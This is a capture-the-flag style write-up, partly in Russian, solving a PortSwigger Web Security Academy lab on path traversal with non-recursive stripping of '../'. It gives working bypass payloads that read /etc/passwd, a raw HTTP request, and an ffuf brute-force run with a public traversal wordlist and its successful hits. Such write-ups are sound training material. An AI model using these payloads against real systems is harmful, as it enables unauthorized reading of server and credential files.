# File path traversal, traversal sequences stripped non-recursively
PRACTITIONER

This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

## Решение
Попробую различные способы обхода вырезания последовательностей символов навигации по дереву каталогов:
* `/image?filename=....\/....\/....\/....\/etc/passwd`
* `/image?filename=..//..//..//..//etc//passwd`
* `/image?filename=...//....//....//....//etc/passwd`
```
GET /image?filename=...//....//....//....//etc/passwd HTTP/2
Host: 0afa000803f7c64a8251667600ee0079.web-security-academy.net
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Cache-Control: max-age=0
```
Задание выполнено.
### Перебор
Перебор по словарю [dotdotpwn.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/dotdotpwn.txt) принёс ряд результатов, среди них:
* `/image?filename=%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc%2fpasswd`
* `/image?filename=%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc%2fpasswd`
* `/image?filename=%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc%2fpasswd`
* `/image?filename=%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc%2fpasswd`
* `/image?filename=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2f%2fpasswd`
Они сводятся к URL-кодированию и к тому, что комбинация символов "../" помещается в различные части пути, например, `/image?filename=../../../../etc/passwd` превращается в:
1. `/image?filename=....//....//....//....//etc/passwd`
2. `/image?filename=..././..././..././..././etc/passwd`

Через ffuf:
```
┌──(tinker㉿catpants)-[~/projects/web-security]
└─$ ffuf -request pt03.txt -c -t 10 -w ~/dotdotpwn.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0add0063045490768087a8c6007a0095.web-security-academy.net/image?filename=FUZZ
 :: Wordlist         : FUZZ: /home/tinker/dotdotpwn.txt
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Referer: https://0add0063045490768087a8c6007a0095.web-security-academy.net/
 :: Header           : Te: trailers
 :: Header           : Host: 0add0063045490768087a8c6007a0095.web-security-academy.net
 :: Header           : Cookie: session=vaVlAfazICl6QDr1PvzUOJDRhVgLGgRG
 :: Header           : Accept: image/avif,image/webp,*/*
 :: Header           : Sec-Fetch-Mode: no-cors
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Sec-Fetch-Dest: image
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

..././..././..././etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 141ms]
..././..././..././etc/issue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 104ms]
..././..././..././..././etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 108ms]
..././..././..././..././etc/issue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 116ms]
..././..././..././..././..././etc/issue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 121ms]
..././..././..././..././..././etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 107ms]
..././..././..././..././..././..././etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 118ms]                                                                                                     
..././..././..././..././..././..././etc/issue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 111ms]
.../.%2f.../.%2f.../.%2fetc%2fpasswd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 127ms]
.../.%2f.../.%2f.../.%2fetc%2fissue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 106ms]
.../.%2f.../.%2f.../.%2f.../.%2fetc%2fpasswd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 95ms]                                                                                                        
.../.%2f.../.%2f.../.%2f.../.%2fetc%2fissue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 102ms]
.../.%2f.../.%2f.../.%2f.../.%2f.../.%2fetc%2fpasswd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 138ms]                                                                                               
.../.%2f.../.%2f.../.%2f.../.%2f.../.%2f.../.%2fetc%2fissue [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 116ms]                                                                                            
.../.%2f.../.%2f.../.%2f.../.%2f.../.%2f.../.%2fetc%2fpasswd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 117ms]    
```
